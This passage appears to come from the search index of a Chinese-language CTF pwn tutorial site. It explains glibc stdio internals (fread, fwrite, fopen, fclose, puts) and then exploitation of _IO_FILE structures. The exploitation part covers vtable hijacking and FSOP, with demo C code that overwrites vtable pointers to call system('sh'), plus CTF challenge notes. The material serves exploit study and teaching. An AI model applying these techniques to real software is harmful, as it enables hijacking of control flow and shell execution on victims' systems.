fread \u662f\u6807\u51c6 IO \u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fread ( void * buffer , size_t size , size_t count , FILE * stream ) ; buffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002 size\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002 count\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002 stream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002 \u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570 fread \u7684\u4ee3\u7801\u4f4d\u4e8e / libio/iofread.c \u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn \u4e2d\u3002 _IO_size_t _IO_fread ( buf , size , count , fp ) void * buf ; _IO_size_t size ; _IO_size_t count ; _IO_FILE * fp ; { ... bytes_read = _IO_sgetn ( fp , ( char * ) buf , bytes_requested ); ... } \u5728_IO_sgetn \u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN \u662f_IO_FILE_plus.vtable \u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728*\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51fa vtable \u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528*\u3002 _IO_size_t _IO_sgetn ( fp , data , n ) _IO_FILE * fp ; void * data ; _IO_size_t n ; { return _IO_XSGETN ( fp , data , n ); } \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn \u51fd\u6570\u7684\uff0c if ( fp -> _IO_buf_base && want < ( size_t ) ( fp -> _IO_buf_end - fp -> _IO_buf_base )) { if ( __underflow ( fp ) == EOF ) break ; continue ; }","title":"fread"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#fwrite","text":"\u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofwrite . c libio / libioP . h libio / fileops . c fwrite \u540c\u6837\u662f\u6807\u51c6 IO \u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fwrite ( const void * buffer , size_t size , size_t count , FILE * stream ); buffer: \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9 fwrite \u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740; size: \u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570; count: \u8981\u8fdb\u884c\u5199\u5165 size \u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570; stream: \u76ee\u6807\u6587\u4ef6\u6307\u9488; \u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570 count\u3002 fwrite \u7684\u4ee3\u7801\u4f4d\u4e8e / libio/iofwrite.c \u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002 \u5728_IO_fwrite \u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN \u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002 \u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus \u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN \u4f4d\u4e8e_IO_FILE_plus \u7684 vtable \u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51fa vtable \u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002 written = _IO_sputn ( fp , ( const char * ) buf , request ); \u5728_IO_XSPUTN \u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn \u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8e vtable \u4e2d\u7684_IO_OVERFLOW /* Next flush the (full) buffer. */ if ( _IO_OVERFLOW ( f , EOF ) == EOF ) _IO_OVERFLOW \u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow if ( ch == EOF ) return _IO_do_write ( f , f -> _IO_write_base , f -> _IO_write_ptr - f -> _IO_write_base ); if ( f -> _IO_write_ptr == f -> _IO_buf_end ) /* Buffer is really full */ if ( _IO_do_flush ( f ) == EOF ) return EOF ; \u5728_IO_new_file_overflow \u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3 write \u51fd\u6570","title":"fwrite"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#fopen","text":"\u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofopen . c libio / fileops . c libio / genops . c fopen \u5728\u6807\u51c6 IO \u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b FILE * fopen ( char * filename , * type ); filename: \u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84 type: \u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b \u8fd4\u56de\u503c: \u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488 \u5728 fopen \u5185\u90e8\u4f1a\u521b\u5efa FILE \u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b \u9996\u5148\u5728 fopen \u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u51fd\u6570\uff0c\u5206\u914d FILE \u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5 FILE \u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684 * new_f = ( struct locked_FILE * ) malloc ( sizeof ( struct locked_FILE )); \u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684 FILE \u521d\u59cb\u5316 vtable\uff0c\u5e76\u8c03\u7528_IO_file_init \u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c _IO_JUMPS ( & new_f -> fp ) = & _IO_file_jumps ; _IO_file_init ( & new_f -> fp ); \u5728_IO_file_init \u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in \u628a\u65b0\u5206\u914d\u7684 FILE \u94fe\u5165_IO_list_all \u4e3a\u8d77\u59cb\u7684 FILE \u94fe\u8868\u4e2d void _IO_link_in ( fp ) struct _IO_FILE_plus * fp ; { if (( fp -> file . _flags & _IO_LINKED ) == 0 ) { fp -> file . _flags |= _IO_LINKED ; fp -> file . _chain = ( _IO_FILE * ) _IO_list_all ; _IO_list_all = fp ; ++ _IO_list_all_stamp ; } } \u4e4b\u540e__fopen_internal \u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen \u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen \u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3 open \u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002 if ( _IO_file_fopen (( _IO_FILE * ) new_f , filename , mode , is32 ) != NULL ) return __fopen_maybe_mmap ( & new_f -> fp . file ); \u603b\u7ed3\u4e00\u4e0b fopen \u7684\u64cd\u4f5c\u662f \u4f7f\u7528 malloc \u5206\u914d FILE \u7ed3\u6784 \u8bbe\u7f6e FILE \u7ed3\u6784\u7684 vtable \u521d\u59cb\u5316\u5206\u914d\u7684 FILE \u7ed3\u6784 \u5c06\u521d\u59cb\u5316\u7684 FILE \u7ed3\u6784\u94fe\u5165 FILE \u7ed3\u6784\u94fe\u8868\u4e2d \u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6","title":"fopen"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#fclose","text":"\u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofclose . c fclose \u662f\u6807\u51c6 IO \u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0e fopen \u76f8\u53cd\u3002 int fclose ( FILE * stream ) \u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528 fclose \u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a fclose \u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it \u5c06\u6307\u5b9a\u7684 FILE \u4ece_chain \u94fe\u8868\u4e2d\u8131\u94fe if ( fp -> _IO_file_flags & _IO_IS_FILEBUF ) _IO_un_link (( struct _IO_FILE_plus * ) fp ); \u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it \u51fd\u6570\uff0c_IO_file_close_it \u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3 close \u5173\u95ed\u6587\u4ef6 if ( fp -> _IO_file_flags & _IO_IS_FILEBUF ) status = _IO_file_close_it ( fp ); \u6700\u540e\u8c03\u7528 vtable \u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish \u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528 free \u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684 FILE \u7ed3\u6784 _IO_FINISH ( fp );","title":"fclose"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#printfputs","text":"printf \u548c puts \u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728 printf \u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf \u4f1a\u88ab\u4f18\u5316\u4e3a puts \u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002 puts \u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0e fwrite \u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a**\u8c03\u7528 vtable \u4e2d\u7684_IO_sputn**\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3 write \u51fd\u6570\u3002 printf \u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn \u5b9e\u73b0 vfprintf + 11 _IO_file_xsputn _IO_file_overflow funlockfile _IO_file_write write","title":"printf/puts"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#vtable","text":"\u4fee\u6539 vtable \u4e2d\u67d0\u4e9b\u51fd\u6570\u7684\u6307\u9488 >=libc 2.23 \u2192 \u901a\u8fc7\u4f2a\u9020 vtable \u7ed3\u6784\u4f53\u6765\u8c03\u7528\u67d0\u4e9b\u51fd\u6570\u7684\u6307\u9488","title":"\u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_3","text":"IO \u64cd\u4f5c\u51fd\u6570\u9700\u8981\u7ecf\u8fc7 FILE \u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f _IO_FILE_plus \u7ed3\u6784\u4e2d\u5b58\u5728 vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51fa vtable \u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002 \u56e0\u6b64\u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f**\u9488\u5bf9_IO_FILE_plus \u7684 vtable \u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628a vtable \u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002** vtable \u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199 vtable \u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6 vtable \u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002","title":"\u7b80\u4ecb"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_4","text":"\u4fee\u6539 vtable \u4e2d\u7684\u6307\u9488\uff0c int main ( void ) { FILE * fp ; long long * vtable_ptr ; fp = fopen ( \"123.txt\" , \"rw\" ); vtable_ptr =* ( long long * )(( long long ) fp + 0xd8 ); //get vtable vtable_ptr [ 7 ] = 0x41414141 //xsputn printf ( \"call 0x41414141\" ); } \u6839\u636e vtable \u5728 _IO_FILE_plus \u7684\u504f\u79fb\u5f97\u5230 vtable \u7684\u5730\u5740\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f 0xd8\u3002\u4e4b\u540e\u641e\u6e05\u695a\u52ab\u6301\u7684 IO \u51fd\u6570\u4f1a\u8c03\u7528 vtable \u4e2d\u7684\u54ea\u4e2a\u865a\u51fd\u6570\u3002vtable \u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684 _IO_FILE_plus \u5730\u5740\u3002\u6bd4\u5982\u8c03\u7528 printf \uff0c\u4f20\u9012\u7ed9 vtable \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f _IO_2_1_stdout_ \u7684\u5730\u5740\u3002\u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684 vtable \u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982 #define system_ptr 0x7ffff7a52390; int main ( void ) { FILE * fp ; long long * vtable_ptr ; fp = fopen ( \"123.txt\" , \"rw\" ); vtable_ptr =* ( long long * )(( long long ) fp + 0xd8 ); //get vtable memcopy ( fp , \"sh\" , 3 ); vtable_ptr [ 7 ] = system_ptr //xsputn fwrite ( \"hi\" , 2 , 1 , fp ); } \u4f46\u662f\u5728\u76ee\u524d libc2.23 \u7248\u672c\u4e0b\uff0c\u4f4d\u4e8e libc \u6570\u636e\u6bb5\u7684 vtable \u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684 \u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020 vtable \u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002 #define system_ptr 0x7ffff7a52390; int main ( void ) { FILE * fp ; long long * vtable_addr , * fake_vtable ; fp = fopen ( \"123.txt\" , \"rw\" ); fake_vtable = malloc ( 0x40 ); vtable_addr = ( long long * )(( long long ) fp + 0xd8 ); //vtable offset vtable_addr [ 0 ] = ( long long ) fake_vtable ; memcpy ( fp , \"sh\" , 3 ); fake_vtable [ 7 ] = system_ptr ; //xsputn fwrite ( \"hi\" , 2 , 1 , fp ); } \u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e**\u4f2a\u9020\u7684 vtable\uff0c\u4e4b\u540e\u4fee\u6539 _IO_FILE_plus \u7684 vtable \u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58**\u3002\u56e0\u4e3a vtable \u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662f system \u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570 \"/bin/sh\" \u6216 \"sh\"\u3002 \u56e0\u4e3a vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684 _IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a \"sh\" \u5199\u5165 _IO_FILE_plus \u5934\u90e8 \u3002\u4e4b\u540e\u5bf9 fwrite \u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684 vtable \u6267\u884c system(\"sh\")\u3002 \u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728 fopen \u7b49\u51fd\u6570\u521b\u5efa\u7684 _IO_FILE \u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9 stdin\\stdout\\stderr \u7b49\u4f4d\u4e8e libc.so \u4e2d\u7684 _IO_FILE \uff0c\u8fd9\u4e9b\u6d41\u5728 printf\\scanf \u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728 libc2.23 \u4e4b\u524d\uff0c\u8fd9\u4e9b vtable \u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002 print &_IO_2_1_stdin_ $2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 <_IO_2_1_stdin_> 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so","title":"\u539f\u7406\u793a\u4f8b"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_5","text":"vtable \u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff1a \u76f4\u63a5\u6539\u5199 vtable \u4e2d\u7684\u865a\u51fd\u6570\u6307\u9488 \u8986\u76d6 vtable \u7684\u6307\u9488\uff08\u4f2a\u9020 vtabel\uff09 libc2.23 \u7248\u672c\u4e0b\uff0c\u4f4d\u4e8e libc \u6570\u636e\u6bb5\u7684 vtable \u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165 vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684 _IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u53ef\u4ee5\u5c06 sh \u6216\u5176\u4ed6\u53c2\u6570\u5199\u5165 _IO_FILE_plus \u5934\u90e8","title":"\u5c0f\u7ed3"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_6","text":"","title":"\u4f8b\u9898"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#2018-hctf-the_end","text":"\u9898\u76ee\u94fe\u63a5 \u901a\u8fc7\u4f2a\u9020 vtabel \u5b9e\u73b0\u8fd0\u884c\u7279\u5b9a\u51fd\u6570\uff08\u4fee\u6539\u865a\u51fd\u6570\u7684 overflow \u6307\u9488\uff09 \u5176\u4ed6\u505a\u6cd5\uff1a https://blog.csdn.net/Mira_Hu/article/details/103736917","title":"2018 HCTF the_end"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_7","text":"\u9664\u4e86 canary \u4fdd\u62a4\u5168\u5f00\uff0c\u4efb\u610f\u5730\u5740\u5199 5 \u5b57\u8282","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_8","text":"\u5728\u7a0b\u5e8f\u8c03\u7528 exit \u540e\uff0c\u4f1a\u904d\u5386 IO_list_all \uff0c\u8c03\u7528 _IO_2_1_stdout \u4e0b\u7684 vatable \u4e2d _setbuf \u51fd\u6570\u3002\u5148\u4fee\u6539\u4e24\u4e2a\u5b57\u8282\u5728\u5f53\u524d vtable \u9644\u8fd1\u4f2a\u9020\u4e00\u4e2a fake_vtable \uff0c\u7136\u540e\u4f7f\u7528 3 \u4e2a\u5b57\u8282\u4fee\u6539 fake_vtable \u4e2d _setbuf \u7684\u5185\u5bb9\u4e3a one_gadget \u3002","title":"\u601d\u8def"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#fsop","text":"","title":"FSOP"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_9","text":"\u8fdb\u7a0b\u5185\u6240\u6709\u7684 _IO_FILE \u7ed3\u6784\u4f1a\u4f7f\u7528 _chain \u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531 _IO_list_all \u7ef4\u62a4\u3002 FSOP \u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301 _IO_list_all \u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684 _IO_FILE \u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP \u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528 _IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0 _IO_list_all \u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2a FILE \u8c03\u7528 fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528 _IO_FILE_plus.vtable \u4e2d\u7684 _IO_overflow\u3002 int _IO_flush_all_lockp ( int do_lock ) { ... fp = ( _IO_FILE * ) _IO_list_all ; while ( fp != NULL ) { ... if ((( fp -> _mode <= 0 && fp -> _IO_write_ptr > fp -> _IO_write_base )) && _IO_OVERFLOW ( fp , EOF ) == EOF ) { result = EOF ; } ... } } \u800c _IO_flush_all_lockp \u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a \u5f53 libc \u6267\u884c abort \u6d41\u7a0b\u65f6 \u5f53\u6267\u884c exit \u51fd\u6570\u65f6 \u5f53\u6267\u884c\u6d41\u4ece main \u51fd\u6570\u8fd4\u56de\u65f6","title":"\u4ecb\u7ecd"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_10","text":"FSOP \u5229\u7528\u7684\u6761\u4ef6\uff1a\u6cc4\u9732 libc.so \u57fa\u5740\uff0c\u56e0\u4e3a _IO_list_all \u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728 libc.so \u4e2d\u7684\uff1b\u7528\u4efb\u610f\u5730\u5740\u5199\u628a _IO_list_all \u6539\u4e3a\u6307\u5411\u53ef\u63a7\u5185\u5b58\u7684\u5730\u5740\uff1b\u4f2a\u9020 _IO_FILE_plus \u7ed3\u6784\u4f53\u3002\u4f2a\u9020\u7ed3\u6784\u4f53\u9700\u8981 bypass \u8fd9\u4e9b check \uff1a if ((( fp -> _mode <= 0 && fp -> _IO_write_ptr > fp -> _IO_write_base )) && _IO_OVERFLOW ( fp , EOF ) == EOF ) { result = EOF ; } \u4e5f\u5c31\u662f fp->_mode <= 0 fp->_IO_write_ptr > fp->_IO_write_base \u5199\u4e00\u4e2a demo \u9a8c\u8bc1\u4e00\u4e0b\uff1a\u9996\u5148\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020 _IO_FILE_plus\uff08_IO_FILE\u3001vtable)\u3002_IO_write_ptr\u3001_IO_write_base\u3001_mode \u7b49\u6570\u636e\u504f\u79fb\u5982\u4e0b\uff08\u53ef\u4ee5\u901a\u8fc7\u67e5\u524d\u9762\u7ed9\u51fa\u7ed3\u6784\u4f53\u7b97\u51fa\u6765\uff09\uff1a #define _IO_list_all 0x7ffff7dd2520 #define writebase_offset 0x20 #define writeptr_offset 0x28 #define mode_offset 0xc0 #define vtable_offset 0xd8 int main ( void ) { void * ptr ; long long * list_all_ptr ; ptr = malloc ( 0x200 ); //bypass * ( long long * )(( long long ) ptr + mode_offset ) = 0x0 ; * ( long long * )(( long long ) ptr + writeptr_offset ) = 0x1 ; * ( long long * )(( long long ) ptr + writebase_offset ) = 0x0 ; * ( long long * )(( long long ) ptr + vtable_offset ) = (( long long ) ptr + 0x100 ); //vtable _IO_overflow * ( long long * )(( long long ) ptr + 0x100 + 24 ) = 0x41414141 ; //orw _IO_list_all _chain 2 fake _IO_FILE_plus list_all_ptr = ( long long * ) _IO_list_all ; list_all_ptr [ 0 ] = ptr ; exit ( 0 ); } \u524d 0x100 \u4e2a\u5b57\u8282\u4f5c\u4e3a _IO_FILE \uff0c\u540e 0x100 \u4e2a\u5b57\u8282\u4f5c\u4e3a vtable \uff0c\u5728 vtable _IO_overflow \u6307\u9488\u52ab\u6301\u4e3a 0x41414141 \u3002 \u4e4b\u540e\uff0c\u8986\u76d6 libc \u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all \u6307\u5411\u4f2a\u9020\u7684 _IO_FILE_plus \u3002 \u5168\u5c40\u53d8\u91cf _IO_list_all \u5b58\u50a8\u7740\u7ed3\u6784\u4f53 _IO_FILE_plus \u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u4e5f\u662f _IO_FILE \u6240\u5728\u5730\u5740\uff0c\u540e\u9762\u662f vtable \u901a\u8fc7\u8c03\u7528 exit \u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7 fflush 1 \u83b7\u53d6 _IO_list_all \u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a _IO_FILE_plus **\u8c03\u7528\u5176\u4e2d\u7684 _IO_overflow \u51fd\u6570**\u5b9e\u73b0\u529f\u80fd\uff1a ---> call _IO_overflow [#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0) [#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup() [#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1) [#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=<optimized out>) [#4] 0x4005ce \u2192 Name: main()","title":"\u539f\u7406\u793a\u4f8b"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_11","text":"","title":"\u4f8b\u9898"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#ciscn_2019_n_7","text":"\u5927\u4f53\u662f\u7528 FSOP \u601d\u8def\uff0c\u4e0d\u662f\u52ab\u6301 _IO_list_all _chain \u6307\u9488\u4f2a\u9020\u4e00\u4e2a\u7ed3\u6784\u4f53\uff1b\u800c\u76f4\u63a5\u4fee\u6539 _IO_FILE_plus","title":"ciscn_2019_n_7"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_12","text":"\u4fdd\u62a4\u5168\u5f00\uff0c\u7528\u7684\u662f buu 